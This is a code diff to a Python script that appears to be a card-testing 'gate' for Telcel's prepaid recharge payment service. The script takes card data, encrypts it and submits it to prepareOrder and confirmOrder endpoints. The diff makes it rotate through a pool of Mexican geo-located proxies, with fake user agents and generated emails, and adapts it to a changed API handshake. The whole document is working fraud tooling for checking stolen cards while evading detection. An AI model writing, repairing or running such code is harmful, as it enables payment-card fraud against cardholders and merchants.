@@ -5,10 +5,11 @@ from fake_useragent import UserAgent
 from faker import Faker
 
 """ Proxy. El gate TELCEL define su propia región (MX) leyendo
-php/proxies_mx.txt (igual que el generador hace con proxies_jp.txt para JP).
-Si el archivo está vacío, cae al env TELCEL_PROXY. Si tampoco, sin proxy.
-El pool puede tener formato 'user:pass@host:port' (sin esquema) — `requests`
-necesita 'http://user:pass@host:port'. """
+php/proxies_mx.txt (999 sesiones geo-mx). Si el archivo está vacío, cae al
+env TELCEL_PROXY. Si tampoco, sin proxy. El pool puede tener formato
+'user:pass@host:port' (sin esquema) — `requests` necesita
+'http://user:pass@host:port'. gets rotated per call so each retry uses a
+different geo-mx session instead of a fixed one. """
 def _normalize_proxy(p: str) -> str:
     p = (p or '').strip()
     if not p:
@@ -19,9 +20,13 @@ def _normalize_proxy(p: str) -> str:
 
 try:
     from api.proxies import get_proxy as _gate_get_proxy
-    prxy = _normalize_proxy(_gate_get_proxy('MX') or os.getenv('TELCEL_PROXY') or '')
+    def _get_prxy() -> str:
+        return _normalize_proxy(_gate_get_proxy('MX') or os.getenv('TELCEL_PROXY') or '')
+    prxy = _get_prxy()
 except Exception:
-    prxy = _normalize_proxy(os.getenv('TELCEL_PROXY') or '')
+    def _get_prxy() -> str:
+        return _normalize_proxy(os.getenv('TELCEL_PROXY') or '')
+    prxy = _get_prxy()
 #End proxy
 
 class RSAEncrypt: # Clase que encripta la tarjeta * SP
@@ -75,6 +80,7 @@ def main(ccs, monto, num):
     with requests.Session() as session:
         try:
             ua = get_ua()
+            prxy = _get_prxy()  # rotate a fresh geo-mx session on every call
             if prxy:
                 prx = {"http": prxy, "https":prxy}
                 session.proxies.update(prx)
@@ -99,31 +105,29 @@ def main(ccs, monto, num):
                 "sec-fetch-mode": "cors",
                 "sec-fetch-dest": "empty",
                 "referer": "https://paymentservice.telcel.com/payments/",
-                "priority": "u=1, i", 
-                "uzlc": "7f9000bcd84e79-07b8-4fbc-97e2-11abf7e275141-17697602171230-0020155235292a387ba1010160219141uPvSx3ffcf1dd8",
+                "priority": "u=1, i",
             }
-            _j = _json(res)
-            sessionid = _j.get("sessionId")
-            web_sess = _j.get("webSession")
-            # El endpoint de Telcel cambió: ya no devuelve sessionId/webSession en JSON,
-            # sino un JWT. Si no vienen, abortamos con mensaje claro en lugar de mandar
-            # null a confirmOrder y provocar el 500 NPE de VestaRequestConfirmDto.getSessionKey().
-            if not sessionid or not web_sess:
-                return {"number": num, "monto": monto, "status": "Error ⚠️",
-                        "message": f"Telcel no devolvió sessionId/webSession — API cambió. "
-                                   f"token_resp={token1[:80]!r} parsed={list(_j.keys())[:5] or 'none'}",
-                        "card": ccs.strip()}
             headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
             encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
             resultm = get_montos(int(monto))
             if not resultm:
                 return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Monto inválido: selecciona un monto válido (20, 30, 50, 80, 100, 150, 200, 300, 500)"}
-            data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": sessionid, "webSession": web_sess }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
+            #//! Nuevo handshake (2026): payment/token ya no devuelve sessionId/webSession.
+            #   Se mandan vacíos en prepareOrder y la API responde el fingerprint.sessionId,
+            #   fingerprint.webSession y paymentId. El viejo JWT solo es el Bearer.
+            data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": "", "webSession": "" }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
             res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
-            if "paymentId" in res.text:
-                paymentid=_json(res).get("paymentId")
-            else:
+            if "paymentId" not in res.text:
                 return {"number": num, "monto": monto, "status": "Declined ❌", "message": res.text[:200], "card": ccs.strip(), "status_resp": res.status_code}
+            _pj = _json(res)
+            paymentid = _pj.get("paymentId")
+            _fp = _pj.get("fingerprint") or {}
+            sessionid  = _fp.get("sessionId") or ""
+            web_sess   = _fp.get("webSession") or ""
+            if not paymentid or not sessionid or not web_sess:
+                return {"number": num, "monto": monto, "status": "Error ⚠️",
+                        "message": f"Telcel prepareOrder no devolvió fingerprint válido: {res.text[:180]}",
+                        "card": ccs.strip(), "status_resp": res.status_code}
             headers = { "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}", "sec-ch-ua-mobile": "?1", "user-agent": ua,"accept": "application/json, text/plain, */*", "content-type": "application/json","sec-gpc": "1", "accept-language": "es-MX,es;q=0.6", "origin": "https://paymentservice.telcel.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors","sec-fetch-dest": "empty",  "referer": "https://paymentservice.telcel.com/payments/"}
             data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}, "paymentId": paymentid}
             res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False)
